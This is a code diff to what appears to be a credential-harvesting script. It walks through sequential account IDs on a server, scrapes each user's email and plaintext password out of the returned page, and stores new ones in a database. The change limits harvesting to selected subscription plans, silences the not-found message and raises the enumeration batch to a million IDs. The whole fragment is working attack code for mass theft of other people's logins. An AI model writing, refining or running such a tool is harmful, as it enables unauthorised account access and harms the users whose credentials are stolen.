@@ -292,15 +292,20 @@ def fetchAccountsMenu(conn):
         resp = server.getUserInfo(session, host, accountId)
         # spliting 
         try:
-            mess = resp.split("id='email"+ str(accountId) +"' value='")[1]
-            username = mess.split("'")[0].strip()
-            password = mess.split(",")[2].split("&lt;")[0].strip()
+            #input id='plan1400365'
+            split = resp.split("id='plan"+ str(accountId) +"'")
+            plan = split[1].split("value='")[1].split("'")[0].strip()
+            #print(plan)
+            if (plan != "-1" and plan != "0" and plan != "1" and plan != "5" and plan != "6" and plan != "7" and plan != "8"):
+                mess = resp.split("id='email"+ str(accountId) +"' value='")[1]
+                username = mess.split("'")[0].strip()
+                password = mess.split(",")[2].split("&lt;")[0].strip()
 
-            # save the details if they are not already there
-            if (fetchAccounts.checkPassword(conn, password, host) == False):
-                fetchAccounts.saveAccount(conn, username, password, str(accountId), host)
+                # save the details if they are not already there
+                if (fetchAccounts.checkPassword(conn, password, host) == False):
+                    fetchAccounts.saveAccount(conn, username, password, str(accountId), host)
         except:
-            print("[-] User Not Found")
+            print("")
 
         # update the last parsed account id
         fetchAccounts.updateLastParsedAccount(conn, str(accountId), host)
@@ -308,7 +313,7 @@ def fetchAccountsMenu(conn):
         # increment the counter
         accountId += 1
         count += 1
-        if (count == 100000):
+        if (count == 1000000):
             keepGoing = input("Press 1 to continue or any other key to exit")
             if (keepGoing == "1"):
                 count = 0
